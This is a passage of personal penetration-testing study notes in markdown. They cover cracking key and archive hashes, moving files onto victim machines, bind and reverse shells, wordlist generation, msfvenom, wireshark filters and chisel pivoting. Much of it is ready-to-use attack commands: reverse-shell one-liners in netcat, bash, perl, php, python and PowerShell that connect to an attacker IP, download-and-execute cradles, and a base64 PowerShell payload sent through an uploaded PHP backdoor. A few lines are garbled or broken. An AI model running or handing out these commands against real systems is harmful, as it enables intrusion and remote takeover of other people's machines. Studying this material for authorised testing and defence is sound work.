  - convert to required type first
    - ssh `ssh2john id_rsa > ssh.hash`
    - zip `zip2john ./file.zip > ./zip.hash`
    - rar `rar2john ./file.rar > ./rar.hash`
    - pgp `gpg2john name.asc > ./gpg.hash`
  - `john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash`

### Transfering files
- set up
  - web servers
    - python
      - `python -m SimpleHTTPServer 1234`
      - `python3 -m http.server 1234`
      - if you get [Errno 98] Address already in use, find PID using netstat and then kill
      - `netstat -tulpn`
      - `kill -9 PID`
    - php
      - `php -S 127.0.0.1:1234`
  - ftp
    - python
      - `pip install pyftpdlib && python3 -m pyftpdlib -p 1234`
- windows ftp
  - `ftp -v -n -s:ftp.txt`
  -  
    ```s
    ## ftp.txt
    open 10.11.12.13
    USER ftpuser
    Password123
    bin
    GET nc.exe
    bye
    ```
- scp
  - `scp -P 2222 username@$IP:/challenge/try-harder.mp3 ~/try-harder.mp3`
- powershell
  - Download and execute script
    - `powershell.exe iex (New-Object Net.WebClient).DownloadString("http://host/file.ps1")`
  - Download and save file
    - `powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.20/nc.exe','c:\temp\nc.exe')`
    - `powershell.exe -c (Start-BitsTransfer -Source "http://10.10.10.20/nc.exe -Destination C:\temp\nc.exe")`
- certutil
  - `certutil.exe -urlcache -split -f "http://10.10.10.20/nc.exe" c:\temp\nc.exe`
- netcat
  - send from attacker to victim
    - victim listens    `nc -nlvp 9000 > incoming.exe`
    - attacker connects `nc -nv 10.11.0.22 9000 < /usr/share/windows-resources/binaries/wget.exe`
- socat
  - send from attacker to victim
    - attacker listens  `sudo socat TCP4-LISTEN:443,fork file:secret_password.txt`
    - victim connects   `socat TCP4:10.11.0.4:443`
- [powercat](https://github.com/besimorhino/powercat)
      - install `iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')`
      - send from victim to attacker
        - attacker listens    `sudo nc -nlvp 443 > receiving_file.txt`
        - victim connects     `powercat -c 10.11.0.4 -p 443 -i c:\users\sending_file.txt`

### Shells

#### bind shell

```mermaid
  flowchart LR
  A[attacker]-->| attacker initiates connection |B[victim]
```
- netcat
  - victim listens    `nc -lvp 4444 –e cmd.exe`
  - attacker connects `nc 192.168.1.1 4444`
- socat 
  - victim listens `socat -d -d TCP4-LISTEN:4444 EXEC:/bin/bash`
    - EXEC:/bin/bash    linux
    - EXEC:'cmd.exe',pipes    windows
  - attacker connects `socat - TCP4:192.168.168.130:4444`
- powershell
  - victim listens      `powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"`
    - this can also be base64 encoded 
  - attacker connects   `nc -nv 10.11.0.22 4444` 
- [powercat](https://github.com/besimorhino/powercat)        
  - install iex `(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')`
  - victim listens      `powercat -l -p 4444 -e cmd.exe`
  - victim connects     `nc 10.11.0.22 443`

#### reverse shell 
```mermaid
  flowchart LR
  A[victim]-->| victim initiates connection |B[attacker]
```
- netcat
  - attacker listens    `nc –lvp 4444`
  - victim connects     `nc.exe 192.168.100.113 4444 –e cmd.exe`
    - –e cmd.exe    windows
    - -e /bin/bash  linux
- socat
  - attacker listens    `socat -d -d TCP4-LISTEN:4444 STDOUT`
  - victim connects     `socat TCP4:192.168.168.1:4444 EXEC:/bin/bash`
    - EXEC:/bin/bash    linux
    - EXEC:'cmd.exe',pipes    windows
- sh
  - `/bin/sh -i >& /dev/tcp/192.168.45.210/4444 0>&1`
  - bash -c "bash -i >& /dev/tcp/192.168.45.210/4444 0>&1"

- bash
  - attacker listens    `nc –lvp 5555`
  - victim connects     `bash -i >& /dev/tcp/192.168.45.187/5555 0>&1`
- perl
  - attacker listens    `nc –lvp 4444`
  - victim connects     `perl -e 'use Socket;$i="192.168.100.113"″";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
- php
  - attacker listens    `nc –lvp 4444`
  - victim connects     `php -r '$sock=fsockopen("192.168.100.113",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
- python
  - attacker listens    `nc –lvp 4444`
  - victim connects     `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.113,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- powershell
  - standard
    - attacker listens    `nc -lnvp 4444`
    - victim connects     `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
  - base-64 encrypted 
    - ```
      $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
      $EncodedText =[Convert]::ToBase64String($Bytes)

      # deliver via curl to simple-backdoor.php
      curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<INSERT $EncodedText HERE> 

      ```
- powercat
  - install iex `(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')`
  - attacker listens    `nc -nlvp 4444`
  - victim connects     `powercat 10.11.0.4 -p 4444 -e cmd.exe`

#### encrypted shells
- generate key and certificate
  - `openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out bind.crt`
  - `openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 362 -out bind.crt`
- convert them to a pem file
  - `cat bind.key bind.crt L > bind.pem`
- bind shell
  - socat
    - attacker connects   `socat - OPENSSL:192.168.168.130:4443,verify=0`
    - victim listens      `socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:/bin/bash`
      - EXEC:/bin/bash          linux
      - EXEC:'cmd.exe',pipes    windows
- reverse shell
  - socat
    - attacker listens    `socat -d -d OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork STDOUT`
    - victim connects     `socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:/bin/bash`
      - EXEC:/bin/bash          linux
      - EXEC:'cmd.exe',pipes    windows

### Password files
- linux
  - /etc/passwd
  - ssh keys depend on type defined at creation
    - RSA   /home/username/.ssh/id_rsa
    - ECDSA /home/username/.ssh/id_ecdsa

#### Wordlists / Password lists
- /usr/share/wordlists
  - passwords
    - rockyou.txt
  - subdomains 
- generate from www [cewl](https://www.kali.org/tools/cewl/)
  - `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
    - -m    minimum word length
    - -w    output file
- generate from pattern [crunch](https://null-byte.wonderhowto.com/how-to/tutorial-create-wordlists-with-crunch-0165931/)
  - `shell crunch 8 8 -t ,@@^^%%%`
  - `shell crunch 4 6 0123456789ABCDEF -o crunch.txt` min 4 max 6 and only 0123456789ABCDEF
    - min length then max length
    - -t  specific pattern
      - @ lowercase
      - , uppercase
      - % numbers
      - ^ special chars
    - -o output

### msfvenom
    - linux reverse shell 
      - `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your IP address> LPORT=4444 -f elf -o reverse_shell.elf`

### wireshark
- display filters
  - Wireshark Filter by IP          `ip.addr == 10.10.50.1`
  - Filter by Destination IP        `ip.dest == 10.10.50.1`
  - Filter by Source IP             `ip.src == 10.10.50.1`
  - Filter by IP range              `ip.addr >= 10.10.50.1 and ip.addr <= 10.10.50.100`
  - Filter by Multiple Ips          `ip.addr == 10.10.50.1 and ip.addr == 10.10.50.100`
  - Filter out/ Exclude IP address  `!(ip.addr == 10.10.50.1)`
  - Filter IP subnet                `ip.addr == 10.10.50.1/24`
  - Filter by multiple specified IP subnets   `ip.addr == 10.10.50.1/24 and ip.addr == 10.10.51.1/24`
  - Filter by Protocol 
    - dns
    - http
    - ftp
    - ssh
    - arp
    - telnet
    - icmp
  - Filter by port (TCP)              tcp.port == 25
  - Filter by destination port (TCP)  tcp.dstport == 23
  - Filter by ip address and port     ip.addr == 10.10.50.1 and Tcp.port == 25
  - Filter by URL                     http.host == "host name"
  - Filter by time stamp              frame.time >= "June 02, 2019 18:04:00"
  - Filter SYN flag                   
    - `tcp.flags.syn == 1`
    - `tcp.flags.syn == 1 and tcp.flags.ack == 0`
  - Wireshark Beacon Filter           wlan.fc.type_subtype = 0x08
  - Wireshark broadcast filter        eth.dst == ff:ff:ff:ff:ff:ff
  - WiresharkMulticast filter         (eth.dst[0] & 1)
  - Host name filter                  ip.host = hostname
  - MAC address filter                eth.addr == 00:70:f4:23:18:c4
  - RST flag filter                   tcp.flags.reset == 1

### networking
- linux
  - ip tables allow all
    - ```s
      iptables -P INPUT ACCEPT
      iptables -P FORWARD ACCEPT
      iptables -P OUTPUT ACCEPT
      ```
  - currently used ports
    - `netstat -tulpn`

### Pivoting - tunneling / proxying
- Local port forwarding (forward local port to remote host?)
- Reverse port forwarding (forward remote port to local host?)
  - Chisel
    - ```mermaid
      flowchart LR
        KALI[kali \n 192.168.100.100 \n./chisel server -p 1111 ]
        M1[M1 \n 192.168.100.131 \n ./chisel32 client 192.168.100.100:1111 R:2222:192.168.110.190:80]
        TARGET[TARGET \n192.168.110.190 \n www]
        subgraph 192.168.100.*
          M1 -..->| client connects to server\n so any requests for port 2222 will be \nredirected to 192.168.110.190:80 | KALI
        end
        subgraph 192.168.110.*
          KALI -->| curl http://127.0.0.1:2222\n through M1| TARGET    
        end
      ```
- Dynamic port forwarding (socks proxy, aka all ports?)

### bash / grep / awk / sed
- get open host name from nmap grepable file
  - `grep "Up" 6343/smb.gnmap | awk '{print $2}' >> 6343/smb.lst`
- read lines from a file
  - `cat 6343/smb.lst | while read line; do echo $line ; done`
- checksum
  - `sha256sum Nessus-10.5.1-debian10_amd64.deb | awk '$1=="c09d5eb580e3ea732e7c5cc1185aec37b24d97365b621108a49e6eb162c0b561"{print"good to go"}' `
- extract using tar
  - `tar -czvf (archive name).tar.gz`
- get links from curl
  - `curl -f -L http://192.168.225.47 | grep -Eo "https?://\S+?\""`
  
### tools

#### burpsuite
  - check your hosts file!
  - repeater
    - allows us to craft new or modify requests
  - intruder
    - is used to attack

#### git
- help - shows the help menu
- clone - clones are repository 
- init - initialises a new repository
- config file contains settings we can edit
  - `git config --list`
- git config --local user.email "hacker@git.com"


ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
  The UserKnownHostsFile=/dev/null and StrictHostKeyChecking=no options have been added to prevent the known-hosts file on our local Kali machine from being corrupted.
https://www.fbi.gov/how-we-can-help-you/safety-resources/scams-and-safety/common-scams-and-crimes/business-email-compromise



-linux
  - show open ports
    - `netstat -tuln`
    - `ss -tuln`




```sh
grep "" | asdf



```